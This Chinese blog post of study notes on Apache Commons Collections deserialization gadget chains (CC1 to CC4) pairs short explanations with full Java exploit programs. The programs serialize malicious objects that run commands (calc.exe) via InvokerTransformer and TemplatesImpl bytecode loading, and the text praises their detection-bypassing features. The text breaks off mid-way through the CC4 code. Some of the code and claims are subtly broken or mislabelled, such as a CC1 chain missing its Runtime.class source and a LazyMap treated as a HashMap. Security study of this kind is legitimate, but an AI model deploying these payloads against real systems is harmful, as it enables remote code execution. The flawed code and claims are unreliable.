---
title: "CC 链（Commons Collections 链）"
date: "2025-09-11 14:56:03"
updated: "2026-05-30 19:24:33"
categories: ["文章", "学习笔记"]
tags: ["CC链"]
thumbnail: "/wp-content/uploads/2025/img-ca68cb28a8d8.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "982"
---
<h2 class="md-end-block md-heading"><span class="md-plain">一、认识 CC 链</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">1.1 基本定义</span></h3>
<p class="md-end-block md-p"><span class="md-plain">CC 链全称为</span><span class="md-pair-s "><strong><span class="md-plain">Apache Commons Collections 链</span></strong></span><span class="md-plain">，是 Java 反序列化漏洞中最经典、应用最广泛的利用链之一。Apache Commons Collections（简称 ACC）是 Apache 基金会开发的一个 Java 工具类库，提供了大量增强型集合类（如</span><span class="md-pair-s" spellcheck="false"><code>TransformedMap</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>LazyMap</code></span><span class="md-plain">）和工具方法，由于其在 Java 生态中的高普及率，成为反序列化漏洞利用的 “绝佳载体”。</span></p>
<p class="md-end-block md-p"><span class="md-plain">CC 链的核心本质是：通过构造特定的 ACC 库类实例，将恶意代码植入到反序列化流程中，当目标应用对恶意序列化数据进行反序列化时，会触发 ACC 库类中预设的 “恶意调用链”，最终执行攻击者的代码（如命令执行、文件操作等）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">1.2 核心原理</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Java 反序列化漏洞的触发前提是 “类重写了</span><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span><span class="md-plain">方法，且该方法中存在可控的危险操作”。CC 链的核心思路是：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用 ACC 库中</span><span class="md-pair-s "><strong><span class="md-plain">实现了</span></strong></span><span class="md-pair-s" spellcheck="false"><code>Serializable</code></span><span class="md-pair-s "><strong><span class="md-plain">接口</span></strong></span><span class="md-plain">（支持序列化）的类；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">这些类的</span><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span><span class="md-plain">方法或其关联方法（如</span><span class="md-pair-s" spellcheck="false"><code>transform()</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>get()</code></span><span class="md-plain">）会调用其他方法，形成 “方法调用链”；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过构造 “恶意调用链”（将</span><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span><span class="md-plain">等可执行命令的类植入链中），让反序列化过程最终触发</span><span class="md-pair-s" spellcheck="false"><code>Runtime.exec()</code></span><span class="md-plain">等危险方法。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">1.3 关键组件</span></h3>
<p class="md-end-block md-p"><span class="md-plain">在 CC 链中，以下 ACC 库类和 Java 原生类是核心组件，几乎所有 CC 子链都会用到：</span></p>

<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-pair-s "><strong><span class="md-plain">接口</span></strong></span><span class="md-plain">：定义了</span><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span><span class="md-plain">方法，是调用链的 “节点模板”；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span><span class="md-pair-s "><strong><span class="md-plain">类</span></strong></span><span class="md-plain">：实现</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">接口，通过反射调用任意类的任意方法（核心危险类，可直接调用</span><span class="md-pair-s" spellcheck="false"><code>Runtime.exec()</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span><span class="md-pair-s "><strong><span class="md-plain">类</span></strong></span><span class="md-plain">：实现</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">接口，可将多个</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">串联成 “调用链”，依次执行每个</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">的</span><span class="md-pair-s" spellcheck="false"><code>transform()</code></span><span class="md-plain">方法；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>TransformedMap</code></span><span class="md-pair-s "><strong><span class="md-plain">类</span></strong></span><span class="md-plain">：增强型 Map，在添加 / 修改元素时会调用预设的</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">处理元素；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>LazyMap</code></span><span class="md-pair-s "><strong><span class="md-plain">类</span></strong></span><span class="md-plain">：增强型 Map，在调用</span><span class="md-pair-s" spellcheck="false"><code>get()</code></span><span class="md-plain">方法获取不存在的键时，会调用预设的</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">生成值。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">二、CC1 链分析（经典基础链）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">2.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 3.1</span>~<span class="md-plain">3.2.1（3.2.2 版本修复了该漏洞）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：利用</span><span class="md-pair-s" spellcheck="false"><code>TransformedMap</code></span><span class="md-plain">的 “元素修改触发</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">” 特性，结合</span><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span><span class="md-plain">串联</span><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span><span class="md-plain">，构造恶意调用链，最终通过反序列化触发</span><span class="md-pair-s" spellcheck="false"><code>Runtime.exec()</code></span><span class="md-plain">。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading md-focus"><span class="md-plain">2.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>TransformedMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>put(Object key, Object value)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">添加元素时调用</span><span class="md-pair-s" spellcheck="false"><code>valueTransformer</code></span><span class="md-plain">处理值</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">串联多个</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">，依次执行</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">通过反射调用目标方法（如</span><span class="md-pair-s" spellcheck="false"><code>exec()</code></span><span class="md-plain">）</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>HashMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>readObject(ObjectInputStream)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">反序列化时会调用</span><span class="md-pair-s" spellcheck="false"><code>putVal()</code></span><span class="md-plain">间接触发</span><span class="md-pair-s" spellcheck="false"><code>put()</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">2.3 调用流程（核心链路）</span></h3>
<div class="md-diagram-panel md-fences-adv-panel">
<div class="md-diagram-panel-header md-fences-adv-panel-header"><img class="alignnone size-large wp-image-983" src="/wp-content/uploads/2025/img-ca68cb28a8d8.png" alt="" width="1024" height="411" /></div>
</div>
<h3 class="md-end-block md-heading"><span class="md-plain">2.4 EXP 实现</span></h3>


```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC1Exp {
    public static void main(String[] args) throws Exception {
        // 1. 构造三个InvokerTransformer，分别实现：获取Runtime类 → 获取Runtime实例 → 执行命令
        Transformer[] transformers = new Transformer[]{
                // 第一步：通过Class.forName获取Runtime.class（参数"java.lang.Runtime"）
                new InvokerTransformer("forName", 
                        new Class[]{String.class}, 
                        new Object[]{"java.lang.Runtime"}),
                // 第二步：调用Runtime.class的getRuntime()方法，获取Runtime实例
                new InvokerTransformer("getMethod", 
                        new Class[]{String.class, Class[].class}, 
                        new Object[]{"getRuntime", new Class[0]}),
                // 第三步：调用Runtime实例的exec()方法，执行命令（此处为calc.exe，Windows计算器）
                new InvokerTransformer("invoke", 
                        new Class[]{Object.class, Object[].class}, 
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", 
                        new Class[]{String.class}, 
                        new Object[]{"calc.exe"})
        };

        // 2. 用ChainedTransformer串联上述Transformer，形成调用链
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 3. 创建普通HashMap，包装为TransformedMap（指定valueTransformer为恶意调用链）
        Map<String, String> normalMap = new HashMap<>();
        normalMap.put("key", "value");
        Map<String, String> maliciousMap = TransformedMap.decorate(normalMap, null, chainedTransformer);

        // 4. 序列化恶意Map（模拟攻击者发送恶意数据）
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1.ser"));
        oos.writeObject(maliciousMap);
        oos.close();

        // 5. 反序列化（模拟目标应用触发漏洞）
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc1.ser"));
        ois.readObject(); // 反序列化时触发调用链，执行calc.exe
        ois.close();
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：原理简单、兼容性强（覆盖 3.x 早期版本），是学习 CC 链的入门案例；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：3.2.2 版本后 ACC 库修复了</span><span class="md-pair-s" spellcheck="false"><code>TransformedMap</code></span><span class="md-plain">的触发逻辑，且依赖</span><span class="md-pair-s" spellcheck="false"><code>HashMap.readObject()</code></span><span class="md-plain">的执行流程，易被安全防护检测。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">三、CC2 链分析（基于 TemplatesImpl 优化）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">3.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 3.1</span>~<span class="md-plain">3.2.1；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：引入 Java 原生类</span><span class="md-pair-s" spellcheck="false"><code>com.sun.org``.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></span><span class="md-plain">（简称</span><span class="md-pair-s" spellcheck="false"><code>TemplatesImpl</code></span><span class="md-plain">），利用其</span><span class="md-pair-s" spellcheck="false"><code>defineClass()</code></span><span class="md-plain">方法加载恶意字节码，替代 CC1 中直接调用</span><span class="md-pair-s" spellcheck="false"><code>Runtime.exec()</code></span><span class="md-plain">的方式，绕开部分检测。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>TemplatesImpl</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>defineClass(String name, byte[] b, int off, int len)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">加载字节码并定义恶意类</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>TemplatesImpl</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>getOutputProperties()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">间接调用</span><span class="md-pair-s" spellcheck="false"><code>defineClass()</code></span><span class="md-plain">和</span><span class="md-pair-s" spellcheck="false"><code>newInstance()</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">触发</span><span class="md-pair-s" spellcheck="false"><code>TemplatesImpl.getOutputProperties()</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">3.3 调用流程（核心链路）</span></h3>
<div class="md-diagram-panel md-fences-adv-panel">
<div class="md-diagram-panel-error md-fences-adv-panel-error"><img class="alignnone size-large wp-image-984" src="/wp-content/uploads/2025/img-ce122cb7e5d2.png" alt="" width="1024" height="949" /></div>
</div>
<h3 class="md-end-block md-heading"><span class="md-plain">3.4 EXP 实现</span></h3>


```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC2Exp {
    // 1. 定义恶意类（继承AbstractTranslet，满足TemplatesImpl加载要求）
    static class MaliciousTranslet extends AbstractTranslet {
        static {
            // static代码块在类加载时执行，触发命令
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler, com.sun.org.apache.xml.internal.serializer.Serializer serializer) throws Exception {}
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler) throws Exception {}
    }

    public static void main(String[] args) throws Exception {
        // 2. 获取恶意类的字节码（模拟攻击者准备恶意字节码）
        byte[] maliciousBytecode = getClassBytecode(MaliciousTranslet.class);

        // 3. 构造TemplatesImpl实例，设置_bytecodes为恶意字节码
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{maliciousBytecode});

        // 4. 构造调用链：触发TemplatesImpl.getOutputProperties()
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getOutputProperties", new Class[0], new Object[0])
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 5. 包装恶意Map并序列化
        Map<String, TemplatesImpl> normalMap = new HashMap<>();
        normalMap.put("key", templates);
        Map<String, TemplatesImpl> maliciousMap = TransformedMap.decorate(normalMap, null, chainedTransformer);

        // 6. 序列化与反序列化（触发漏洞）
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc2.ser"));
        oos.writeObject(maliciousMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc2.ser"));
        ois.readObject();
        ois.close();
    }

    // 辅助方法：获取类的字节码
    private static byte[] getClassBytecode(Class<?> cls) throws Exception {
        File file = new File(cls.getProtectionDomain().getCodeSource().getLocation().toURI());
        FileInputStream fis = new FileInputStream(new File(file, cls.getName().replace(".", "/") + ".class"));
        byte[] bytes = new byte[fis.available()];
        fis.read(bytes);
        fis.close();
        return bytes;
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">3.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：利用字节码加载执行命令，比 CC1 更隐蔽，可绕开对</span><span class="md-pair-s" spellcheck="false"><code>Runtime.exec()</code></span><span class="md-plain">的直接检测；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：依赖</span><span class="md-pair-s" spellcheck="false"><code>TemplatesImpl</code></span><span class="md-plain">类（属于 Xalan 库，部分环境可能缺失），且 ACC 版本限制与 CC1 一致。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">四、CC3 链分析（基于 LazyMap 优化触发方式）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">4.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 3.1</span>~<span class="md-plain">3.2.1；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：用</span><span class="md-pair-s" spellcheck="false"><code>LazyMap</code></span><span class="md-plain">替代 CC1/CC2 中的</span><span class="md-pair-s" spellcheck="false"><code>TransformedMap</code></span><span class="md-plain">，利用</span><span class="md-pair-s" spellcheck="false"><code>LazyMap.get()</code></span><span class="md-plain">方法（获取不存在的键时触发</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">）作为触发点，避免依赖</span><span class="md-pair-s" spellcheck="false"><code>HashMap.put()</code></span><span class="md-plain">的执行流程，进一步绕开检测。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">4.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>LazyMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>get(Object key)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">键不存在时调用</span><span class="md-pair-s" spellcheck="false"><code>factory.transform()</code></span><span class="md-plain">（即</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">）</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>HashMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">反序列化时会调用</span><span class="md-pair-s" spellcheck="false"><code>hash()</code></span><span class="md-plain">，间接触发</span><span class="md-pair-s" spellcheck="false"><code>LazyMap.get()</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">串联恶意调用链</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">4.3 调用流程（核心链路）</span></h3>
<img class="alignnone size-large wp-image-985" src="/wp-content/uploads/2025/img-f69b858d94db.png" alt="" width="1024" height="664" />
<h3 class="md-end-block md-heading"><span class="md-plain">4.4 EXP 实现</span></h3>


```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC3Exp {
    // 1. 定义恶意Translet类
    static class MaliciousTranslet extends AbstractTranslet {
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler, com.sun.org.apache.xml.internal.serializer.Serializer serializer) throws Exception {}
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler) throws Exception {}
    }

    public static void main(String[] args) throws Exception {
        // 2. 准备恶意字节码与TemplatesImpl实例
        byte[] maliciousBytecode = getClassBytecode(MaliciousTranslet.class);
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{maliciousBytecode});

        // 3. 构造调用链：触发TemplatesImpl.getOutputProperties()
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getOutputProperties", new Class[0], new Object[0])
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 4. 用LazyMap包装（factory为恶意调用链），且不添加"triggerKey"（确保get()时触发）
        Map<String, TemplatesImpl> maliciousMap = LazyMap.decorate(new HashMap<>(), chainedTransformer);
        maliciousMap.put("key", templates); // 添加其他键，避免触发

        // 5. 反射修改HashMap的table属性，插入"triggerKey"（反序列化时hash()会触发get()）
        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(maliciousMap);
        for (Object entry : table) {
            if (entry != null) {
                Field keyField = entry.getClass().getDeclaredField("key");
                keyField.setAccessible(true);
                keyField.set(entry, "triggerKey"); // 将键改为不存在的"triggerKey"
                break;
            }
        }

        // 6. 序列化与反序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc3.ser"));
        oos.writeObject(maliciousMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc3.ser"));
        ois.readObject();
        ois.close();
    }

    // 辅助方法：获取类字节码（同CC2）
    private static byte[] getClassBytecode(Class<?> cls) throws Exception {
        File file = new File(cls.getProtectionDomain().getCodeSource().getLocation().toURI());
        FileInputStream fis = new FileInputStream(new File(file, cls.getName().replace(".", "/") + ".class"));
        byte[] bytes = new byte[fis.available()];
        fis.read(bytes);
        fis.close();
        return bytes;
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：触发点从</span><span class="md-pair-s" spellcheck="false"><code>put()</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>get()</code></span><span class="md-plain">，更隐蔽，不依赖元素添加流程，检测绕过能力更强；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：需通过反射修改</span><span class="md-pair-s" spellcheck="false"><code>HashMap</code></span><span class="md-plain">的</span><span class="md-pair-s" spellcheck="false"><code>table</code></span><span class="md-plain">属性，操作较复杂，且 ACC 版本限制不变。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">五、CC4 链分析（结合 PriorityQueue 的被动触发）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">5.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 3.1</span>~<span class="md-plain">3.2.1；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：引入 Java 原生类</span><span class="md-pair-s" spellcheck="false"><code>PriorityQueue</code></span><span class="md-plain">（优先级队列），利用其</span><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span><span class="md-plain">方法中对队列元素的 “排序操作”，被动触发</span><span class="md-pair-s" spellcheck="false"><code>LazyMap.get()</code></span><span class="md-plain">，进一步降低触发流程的 “主动性”，绕开更多防护。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>PriorityQueue</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">反序列化时调用</span><span class="md-pair-s" spellcheck="false"><code>heapify()</code></span><span class="md-plain">对元素排序</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>PriorityQueue</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>heapify()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">调用</span><span class="md-pair-s" spellcheck="false"><code>compare()</code></span><span class="md-plain">比较元素，触发</span><span class="md-pair-s" spellcheck="false"><code>LazyMap.get()</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>LazyMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>get(Object key)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">触发恶意调用链</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">5.3 调用流程（核心链路）</span></h3>
<img class="alignnone size-large wp-image-986" src="/wp-content/uploads/2025/img-a8a3e43cea9c.png" alt="" width="1024" height="895" />
<h3 class="md-end-block md-heading"><span class="md-plain">5.4 EXP 实现</span></h3>


```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class CC4Exp {
    // 1. 恶意Translet类（同CC2/CC3）
    static class MaliciousTranslet extends AbstractTranslet {
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler, com.sun.org.apache.xml.internal.serializer.Serializer serializer) throws Exception {}
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler) throws Exception {}
    }

    public static void main(String[] args) throws Exception {
        // 2. 准备TemplatesImpl实例
        byte[] maliciousBytecode = getClassBytecode(MaliciousTranslet.class);
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{maliciousBytecode});

        // 3. 构造恶意调用链
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getOutputProperties", new Class[0], new Object[0])
        };
